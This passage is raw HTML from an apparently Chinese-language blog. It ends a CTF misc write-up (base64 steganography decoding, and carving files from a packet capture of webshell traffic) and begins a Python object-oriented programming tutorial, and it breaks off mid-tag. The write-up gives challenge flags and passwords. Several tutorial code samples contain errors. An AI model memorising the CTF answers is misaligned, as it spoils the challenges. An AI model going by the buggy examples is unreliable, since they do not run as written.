class="keyword">of</span> a <span class="keyword">private</span> letter.</span><br><span class="line"></span><br><span class="line">The</span><br><span class="line"> advantage <span class="keyword">of</span> steganography, <span class="keyword">over</span> cr</span><br><span class="line">yptography alone, <span class="keyword">is</span> that messages <span class="keyword">do</span> <span class="keyword">not</span> attract attention</span><br><span class="line"> <span class="keyword">to</span> themselves. Plainly <span class="keyword">visible</span> encrypted messages�<span class="keyword">no</span> matter </span><br><span class="line">how unbreakable�will arouse s</span><br><span class="line">uspicion, <span class="keyword">and</span> may <span class="keyword">in</span> themselves be incriminating </span><br><span class="line"><span class="keyword">in</span> countries <span class="keyword">where</span> encryption <span class="keyword">is</span> illegal. Therefore,</span><br><span class="line"> whereas cryptography protects the <span class="keyword">contents</span> <span class="keyword">of</span></span><br><span class="line"> a message, steganography can be said <span class="keyword">to</span> protect b</span><br><span class="line">oth messages <span class="keyword">and</span> communicating parties.</span><br><span class="line"></span><br><span class="line">Steganography inclu</span><br><span class="line">des the concealment <span class="keyword">of</span> information <span class="keyword">within</span> com</span><br><span class="line">puter files. <span class="keyword">In</span> digital steganography, electronic communication</span><br><span class="line">s may <span class="keyword">include</span> steganographic coding insi</span><br><span class="line">de <span class="keyword">of</span> a transport layer, such <span class="keyword">as</span> a <span class="keyword">document</span> <span class="keyword">file</span>, image fil</span><br><span class="line">e, program <span class="keyword">or</span> protocol. Media </span><br><span class="line">files <span class="keyword">are</span> ideal <span class="keyword">for</span> steganographic transmissio</span><br><span class="line">n because <span class="keyword">of</span> their <span class="keyword">large</span> size. <span class="keyword">As</span> </span><br><span class="line">a simple example, a sender might <span class="keyword">start</span> <span class="keyword">with</span> a</span><br><span class="line">n innocuous image <span class="keyword">file</span> <span class="keyword">and</span> adjust the color <span class="keyword">of</span> every <span class="number">100</span>th pixel </span><br><span class="line"><span class="keyword">to</span> correspond <span class="keyword">to</span> a letter <span class="keyword">in</span> the alphabet, a</span><br><span class="line"> <span class="keyword">change</span> so subtle that someone <span class="keyword">not</span> specifically looking f</span><br><span class="line"><span class="keyword">or</span> it <span class="keyword">is</span> unlikely <span class="keyword">to</span> <span class="keyword">notice</span> it.</span><br><span class="line"></span><br><span class="line">The</span><br><span class="line"> <span class="keyword">first</span> recorded uses <span class="keyword">of</span> steganography can be tr</span><br><span class="line">aced back <span class="keyword">to</span> <span class="number">440</span> BC <span class="keyword">when</span> Herodotus mentions two examples o</span><br><span class="line">f steganography <span class="keyword">in</span> The Histories <span class="keyword">of</span> </span><br><span class="line">Herodotus. Demaratus sent a <span class="keyword">warning</span> about a </span><br><span class="line">forthcoming attack <span class="keyword">to</span> Greece <span class="keyword">by</span> w</span><br><span class="line">riting it directly <span class="keyword">on</span> the wooden backing <span class="keyword">of</span> a wax tablet bef</span><br><span class="line">ore applying its beeswax surface. Wax tablets were <span class="keyword">in</span> common <span class="keyword">use</span></span><br><span class="line"> <span class="keyword">then</span> <span class="keyword">as</span> reusable writing surfaces, sometime</span><br><span class="line">s used <span class="keyword">for</span> shorthand. Another ancient example <span class="keyword">is</span> that o</span><br><span class="line">f Histiaeus, who shaved the <span class="keyword">head</span> <span class="keyword">of</span> his most trusted s</span><br><span class="line">lave <span class="keyword">and</span> tattooed a message <span class="keyword">on</span> it. <span class="keyword">After</span> his hair had g</span><br><span class="line">rown the message was hidden. The purpose was <span class="keyword">to</span></span><br><span class="line"> instigate a revolt against the Persians.</span><br><span class="line"></span><br><span class="line">Steganography has b</span><br><span class="line">een widely used, <span class="keyword">including</span> <span class="keyword">in</span> recent historical times <span class="keyword">and</span> t</span><br><span class="line">he <span class="keyword">present</span> day. Possible permutations <span class="keyword">are</span> endless <span class="keyword">and</span></span><br><span class="line"> known examples <span class="keyword">include</span>:</span><br><span class="line">* Hidden messages <span class="keyword">within</span> wax ta</span><br><span class="line">blets: <span class="keyword">in</span> ancient Greece, people wrote me</span><br><span class="line">ssages <span class="keyword">on</span> the wood, <span class="keyword">then</span> covered it <span class="keyword">with</span> wax upon which an innocen</span><br><span class="line">t covering message was written</span><br><span class="line">.</span><br><span class="line">* Hidden messages <span class="keyword">on</span> messenger<span class="string">'s body: also used in ancien</span></span><br><span class="line"><span class="string">t Greece. Herodotus tells the story o</span></span><br><span class="line"><span class="string">f a message tattooed on a slave'</span>s shaved <span class="keyword">head</span>, hidden <span class="keyword">by</span> the</span><br><span class="line"> growth <span class="keyword">of</span> his hair, <span class="keyword">and</span> exposed <span class="keyword">by</span> shaving his <span class="keyword">head</span></span><br><span class="line"> again. The message allegedly carried a <span class="keyword">warning</span> <span class="keyword">to</span> Greece abo</span><br><span class="line">ut Persian invasion plans. Th</span><br><span class="line"><span class="keyword">is</span> method has obvious drawbacks,</span><br><span class="line"> such <span class="keyword">as</span> <span class="keyword">delayed</span> transmission <span class="keyword">while</span> waiting <span class="keyword">for</span> the s</span><br><span class="line">lave<span class="string">'s hair to grow, and the restrictions o</span></span><br><span class="line"><span class="string">n the number and size of mess</span></span><br><span class="line"><span class="string">ages that can be encoded on one person</span></span><br><span class="line"><span class="string">'</span>s scalp.</span><br><span class="line">* <span class="keyword">In</span> WWII, the French Resistance sent <span class="keyword">some</span> messages w</span><br><span class="line">ritten <span class="keyword">on</span> the backs <span class="keyword">of</span> couriers </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">invisible</span> ink.</span><br><span class="line">* Hidden messages <span class="keyword">on</span> paper wr</span><br><span class="line">itten <span class="keyword">in</span> secret inks, <span class="keyword">under</span> other messages</span><br><span class="line"> <span class="keyword">or</span> <span class="keyword">on</span> the blank parts <span class="keyword">of</span> other</span><br><span class="line"> messages.</span><br><span class="line">* Messages written <span class="keyword">in</span> Morse code <span class="keyword">on</span> knitting yarn <span class="keyword">and</span> </span><br><span class="line"><span class="keyword">then</span> knitted <span class="keyword">into</span> a piece <span class="keyword">of</span> clothing wor</span><br><span class="line">n <span class="keyword">by</span> a courier.</span><br><span class="line">* Messages written <span class="keyword">on</span> the back o</span><br><span class="line">f postage stamps.</span><br><span class="line">* During <span class="keyword">and</span> <span class="keyword">after</span></span><br><span class="line"> World War II, espionage agents used photographically p</span><br><span class="line">roduced microdots <span class="keyword">to</span> send information back <span class="keyword">and</span></span><br><span class="line"> forth. Microdots were typically </span><br><span class="line"><span class="keyword">minute</span>, approximately <span class="keyword">less</span> <span class="keyword">than</span> the <span class="keyword">size</span> <span class="keyword">of</span> the <span class="keyword">period</span> prod</span><br><span class="line">uced <span class="keyword">by</span> a typewriter. WWII microdots needed <span class="keyword">to</span> be embedded</span><br><span class="line"> <span class="keyword">in</span> the paper <span class="keyword">and</span> covered <span class="keyword">with</span> an adhesive (such <span class="keyword">as</span> collodion). T</span><br><span class="line">his was reflective <span class="keyword">and</span> thus detectable </span><br><span class="line"><span class="keyword">by</span> viewing against glancing light. Alternative techniques included</span><br><span class="line"> inserting microdots <span class="keyword">into</span> slits cut <span class="keyword">into</span> the edge <span class="keyword">of</span></span><br><span class="line"> post cards.</span><br><span class="line">* During World War II, a spy <span class="keyword">for</span> </span><br><span class="line">Japan <span class="keyword">in</span> <span class="keyword">New</span> York City, Velvalee</span><br><span class="line"> Dickinson, sent information <span class="keyword">to</span> accommodatio</span><br><span class="line">n addresses <span class="keyword">in</span> neutral South Americ</span><br><span class="line">a. She was a dealer <span class="keyword">in</span> dolls, <span class="keyword">and</span> </span><br><span class="line">her letters discussed how many <span class="keyword">of</span> this <span class="keyword">or</span> that doll</span><br><span class="line"> <span class="keyword">to</span> ship. The stegotext was the doll orders, <span class="keyword">while</span> the</span><br><span class="line"> concealed <span class="string">"plaintext"</span> was itself enco</span><br><span class="line">ded <span class="keyword">and</span> gave information about ship movements,</span><br><span class="line"> etc. Her <span class="keyword">case</span> became somewhat fa</span><br><span class="line">mous <span class="keyword">and</span> she became known <span class="keyword">as</span> the</span><br><span class="line"> Doll Woman.</span><br><span class="line">* Cold War <span class="keyword">count</span></span><br><span class="line">er-propaganda. <span class="keyword">In</span> <span class="number">1968</span>, crew membe</span><br><span class="line">rs <span class="keyword">of</span> the USS Pueblo (AGER<span class="number">-2</span>) intelligence ship held <span class="keyword">as</span> pr</span><br><span class="line">isoners <span class="keyword">by</span> North Korea, communicated <span class="keyword">in</span> <span class="keyword">sign</span></span><br><span class="line"> <span class="keyword">language</span> during staged photo opport</span><br><span class="line">unities, informing the United States they </span><br><span class="line">were <span class="keyword">not</span> defectors but rather were being held ca</span><br><span class="line">ptive <span class="keyword">by</span> the North Koreans. <span class="keyword">In</span> other photo</span><br><span class="line">s presented <span class="keyword">to</span> the US, crew members gave <span class="string">"the finger"</span> <span class="keyword">to</span> </span><br><span class="line">the unsuspecting North Koreans, <span class="keyword">in</span> an attempt <span class="keyword">to</span> </span><br><span class="line">discredit photos that showed them smi</span><br><span class="line">ling <span class="keyword">and</span> comfortable.</span><br><span class="line"></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="keyword">http</span>://en.wikipedia.org</span><br><span class="line">/wiki/Steganography</span><br></pre></td></tr></table></figure><p>推测是base64隐写，跑脚本得到flag：<code>flag{Base_sixty_four_point_five}</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deStego</span><span class="params">(stegoFile)</span>:</span></span><br><span class="line">    b64table = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">    <span class="keyword">with</span> open(stegoFile,<span class="string">'r'</span>) <span class="keyword">as</span> stegoText:</span><br><span class="line">        message = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stegoText:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = line[line.index(<span class="string">"="</span>) - <span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                message += <span class="string">""</span>.join([ bin( <span class="number">0</span> <span class="keyword">if</span> i == <span class="string">'='</span> <span class="keyword">else</span> b64table.find(i))[<span class="number">2</span>:].zfill(<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text])[<span class="number">2</span> <span class="keyword">if</span> text.count(<span class="string">'='</span>) ==<span class="number">2</span> <span class="keyword">else</span> <span class="number">4</span>:<span class="number">6</span>]  </span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(int(message[i:i+<span class="number">8</span>],<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(message),<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        print(deStego(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(deStego(<span class="string">"stego.txt"</span>))</span><br></pre></td></tr></table></figure><h2 id="0x0c-功夫再高也怕菜刀"><a href="#0x0c-功夫再高也怕菜刀" class="headerlink" title="0x0c  功夫再高也怕菜刀"></a>0x0c  功夫再高也怕菜刀</h2><blockquote><p> 题目描述：菜狗决定用菜刀和菜鸡决一死战 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\12.jpg" style="zoom:50%;"></p><p>下载附件发现是一个<code>.pcapng</code>文件，是一个wireshark流量包。</p><p>用wireshark打开，<code>ctrl+F</code>查找flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\12_2.jpg"></p><p>发现里面有zip和flag.txt还有6666.jpg。</p><p>追踪6666.jpg那一行的TCP请求，右键追踪TCP流</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\12_3.jpg" alt></p><p>由于图片JPG的文件头是<code>FFD8</code>文件尾是<code>FFD9</code>，将文件另存为 ，然后用文本编辑器，编辑导出的文件，查找并删除第一个jpg文件头（FFD8）和最后一个文件尾（FFD9）之外的字符串，剩下的全是十六进制字符串。然后把十六进制保存为图片，我用的“010 Editor”，打开后新建空白文件，复制图片十六进制字符串到粘贴板，点击菜单栏“Edit-Paste From-Paste From Hex Text”，然后保存为图片就行了，保存后的图片如下图。 </p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\12_4.jpg" alt></p><p>刚才看到里面有存在一个hello.zip，便用foremost处理流量包，分理出一个压缩文件，里面就是flag.txt，为加密文件，联想至刚刚那张复原的图片，用密码<code>Th1s_1s_p4sswd_!!!</code>尝试打开文件，得到flag：<code>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Object-oriented Programming</title>
      <link href="/2019/10/21/Object-oriented-Programming/"/>
      <url>/2019/10/21/Object-oriented-Programming/</url>
      
        <content type="html"><![CDATA[<p>虽然一直再写面向对象编程的语言，但是压根没有对象可以面对，希望写完这篇能有对象可以让我面对！！！</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 面向对象编程(Object-oriented Programming,缩写：OOP)是软件工程中一种具有对象概念的编程范式(Programming Paradigm)，同时也是一种程序开发的抽象方针，与之对应的编程范式还有：函数式编程(Functional Programming)、过程式编程(Procedural Programming)、响应式编程(Reactive Programming)等。  </p><p>面向对象的程序设计（OOP）是面向过程程序设计的继承和发展，它不仅汲取了后者的精华，而且以一种更加接近人类思维的方式来分析和解决问题：程序是对现实世界的抽象和描述，现实世界的基本单元是物体，与之对应的，<strong>程序中的基本单元是对象</strong>。 </p><p>  面向对象思想认为：现实世界是由对象组成的，无论大到一个国家还是小到一个原子，都是如此。并且<strong>对象都由两部分组成： 描述对象状态或属性的数据（变量）以及描述对象行为或者功能的方法（函数）</strong>。并且与面向过程不同，<strong>面向对象是将数据和操作数据的函数紧密结合</strong>，共同构成对象来更加精确地描述现实世界，这是<strong>面向过程和面向对象两者最本质的区别。</strong> </p><h5 id="对象与类"><a href="#对象与类" class="headerlink" title="对象与类"></a>对象与类</h5><p>在面向对象编程中，最常见的表现就是基于类(Class)来表现的，每一个对象实例都有具体的类，即对象的类型。使用类的面向对象编程也称为基于类的编程(Class-based programming)，如常见的Java，C++；而与之类似的有基于原型的编程(Prototype-based programming)，如JavaScript。</p><ul><li>类：定义对象的数据格式(属性类型)和可用过程(方法)，同时也可能包含类成员的数据(如，常量)和过程(如，静态方法)，类其实就是对象的类型/原型(prototype)。</li><li>对象：类的实例，通过类实例化出来的具体实例。</li></ul><h3 id="面向对象的三大特征"><a href="#面向对象的三大特征" class="headerlink" title="面向对象的三大特征"></a>面向对象的三大特征</h3><p> 面向对象的三大特征分别是：封装、继承、多态 。</p><ul><li>封装(Encapsulation)</li></ul><p>通过对象隐藏程序的具体实现细节，将数据与操作包装在一起，对象与对象之间通过消息传递机制实现互相通信（方法调用），具体的表现就是通过提供访问接口实现消息的传入传出。</p><p>封装常常会通过控制访问权限来控制对象之间的互访权限，常见的访问权限：公有(<code>public</code>)，私有(<code>private</code>)，保护(<code>protected</code>)。某些语言可能还会提供更加具体的访问控制，如，Java的package。</p><p>封装的意义：由于封装隐藏了具体的实现，如果实现的改变或升级对于使用方而言是无感知的，提高程序的可维护性；而且封装鼓励程序员把特定数据与对数据操作的功能打包在一起，有利于应用程序的去耦。</p><ul><li>继承(Inheritance)</li></ul><p>支持类的语言基本都支持继承，继承即类之间可以继承，通过继承得到的类称为子类，被继承的类为父类，子类相对于父类更加具体化。</p><p>子类具有自己特有的属性和方法，并且子类使用父类的方法也可以覆盖(重写)父类方法，在某些语言中还支持多继承，但是也带来了覆盖的复杂性。</p><p>继承的意义：继承是代码复用的基础机制</p><ul><li>多态(Polymorphism)</li></ul><p>多态发生在运行期间，即子类型多态，指的是子类型是一种多态的形式，不同类型的对象实体有统一接口，相同的消息给予不同的对象会引发不同的动作。</p><p>多态的意义：提供了编程的灵活性，简化了类层次结构外部的代码，使编程更加注重关注点分离(Separation of concerns，SoC)</p><p>关于面向对象编程的设计模式，可以参考<a href="https://www.jianshu.com/p/3a81c69134c2" target="_blank" rel="noopener">谈谈面向对象编程</a></p><h2 id="Python3面向对象编程"><a href="#Python3面向对象编程" class="headerlink" title="Python3面向对象编程"></a>Python3面向对象编程</h2><blockquote><p>参考：</p><p> <a href="https://blog.csdn.net/weixin_42134789/article/details/80194788" target="_blank" rel="noopener">一文看懂Python面向对象编程核心思想(Python学习与Django入门必看)</a> </p><p> <a href="https://www.runoob.com/python3/python3-class.html" target="_blank" rel="noopener">Python3 面向对象</a></p><p> <a href="https://www.jianshu.com/p/954e9cc89579" target="_blank" rel="noopener">Python面向对象编程</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="comment">#默认为公有变量</span></span><br><span class="line">4name = <span class="string">""</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义私有变量，即在变量前加入 __</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#类专有方法，可重写</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a,w)</span>:</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">        self.num += <span class="number">1</span></span><br><span class="line">    <span class="comment">#类方法一般第一个参数为self</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'I am %s,and I am %d years old'</span> % (self.name,self.age))</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tol</span><span class="params">(cls)</span>:</span></span><br><span class="line">        print(<span class="string">"total numble of people is &#123;&#125;"</span>.format(self.num))</span><br><span class="line">    <span class="comment">#这个为类方法，可直接使用people.tol()</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#student 继承people类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span><span class="params">(people)</span>:</span></span><br><span class="line">    grade = <span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a,w,g)</span>:</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        self.grade = g</span><br><span class="line">4<span class="comment">#方法重写</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"I am a %s student.\nMy name is %s"</span> % (self.grade,self.name))</span><br><span class="line">    <span class="comment">#类的私有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__show_detail</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(self.name+<span class="string">"\t"</span>+self.age+<span class="string">"\t"</span>+self.__weight+<span class="string">"\n"</span>+self.grade)</span><br><span class="line">    <span class="comment">#封装</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getWeight</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.weight</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#python有多重继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sample</span><span class="params">(people, student)</span>:</span></span><br><span class="line">    tag = <span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a,w,g,t)</span>:</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        student.__init__(self,g=g)</span><br><span class="line">        tag = t</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">s1 = student(<span class="string">"Alice"</span>,<span class="number">16</span>,<span class="number">47</span>,<span class="string">"7th grades"</span>)</span><br></pre></td></tr></table></figure><p>python提供类的转有方法，可进行方法重写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__init__ : 构造函数，在生成对象时调用</span><br><span class="line">__del__ : 析构函数，释放对象时使用</span><br><span class="line">__repr__ : 打印，转换</span><br><span class="line">__setitem__ : 按照索引赋值</span><br><span class="line">__getitem__: 按照索引获取值</span><br><span class="line">__len__: 获得长度</span><br><span class="line">__cmp__: 比较运算</span><br><span class="line">__call__: 函数调用</span><br><span class="line">__add__: 加运算</span><br><span class="line">__sub__: 减运算</span><br><span class="line">__mul__: 乘运算</span><br><span class="line">__truediv__: 除运算</span><br><span class="line">__mod__: 求余运算</span><br><span class="line">__pow__: 乘方</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反向运算符重载：   </span><br><span class="line">__radd__: 加运算</span><br><span class="line">__rsub__: 减运算</span><br><span class="line">__rmul__: 乘运算</span><br><span class="line">__rdiv__: 除运算</span><br><span class="line">__rmod__: 求余运算</span><br><span class="line">__rpow__: 乘方</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">复合重载运算符</span><br><span class="line">__iadd__: 加运算</span><br><span class="line">__isub__: 减运算</span><br><span class="line">__imul__: 乘运算</span><br><span class="line">__idiv__: 除运算</span><br><span class="line">__imod__: 求余运算</span><br><span class="line">__ipow__: 乘方</span><br></pre></td></tr></table></figure><hr><h4 id="注：-new-方法"><a href="#注：-new-方法" class="headerlink" title="注：__new__()方法"></a>注：__new__()方法</h4><p>python中定义的类在创建实例对象的时候，会自动执行init()方法，但是在执行init()方法之前，会执行new()方法。</p><p><em>new</em>()的作用主要有两个。</p><p>1.在内存中为对象分配空间<br>2.返回对象的引用。（即对象的内存地址）</p><p>python解释器在获得引用的时候会将其传递给init()方法中的self。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls,*args,**kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'__new__'</span>)</span><br><span class="line">        <span class="keyword">return</span> super().__new__(cls)<span class="comment">#这里一定要返回，否则__init__()方法不会被执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span><span class="comment">#这里的self就是new方法中的return返回值</span></span><br><span class="line">        print(<span class="string">'__init__'</span>)</span><br><span class="line"></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__new__</span><br><span class="line">__init__</span><br></pre></td></tr></table></figure><p>我们一定要在<em>new</em>方法中最后调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> super().__new__(cls)</span><br></pre></td></tr></table></figure><p>否则init方法不会被调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls,*args,**kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'__new__'</span>)</span><br><span class="line">        <span class="comment"># return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span><span class="comment">#这里的self就是new方法中的return返回值</span></span><br><span class="line">        print(<span class="string">'__init__'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__new__</span><br></pre></td></tr></table></figure><p>像以前一样，我们不写<em>new</em>方法试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="comment"># def __new__(cls,*args,**kwargs):</span></span><br><span class="line">    <span class="comment">#     print('__new__')</span></span><br><span class="line">        <span class="comment"># return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span><span class="comment">#这里的self就是new方法中的return返回值</span></span><br><span class="line">        print(<span class="string">'__init__'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__</span><br></pre></td></tr></table></figure><hr><h2 id="私有属性-封装"><a href="#私有属性-封装" class="headerlink" title="私有属性-封装"></a>私有属性-封装</h2><p>在实际开发中，对象 的 某些属性或方法 可能只希望 在对象的内部被使用，而 不希望在外部被访问到</p><p><strong>定义方式</strong></p><p>在 定义属性或方法时，在 属性名或者方法名前 增加 两个下划线__ 实际开发中私有属性也不是一层不变的。所以要给私有属性提供外部能够操作的方法。</p><p>7.1) <strong>通过自定义get set方法提供私有属性的访问</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, name, age)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.__age = age</span><br><span class="line"></span><br><span class="line">    <span 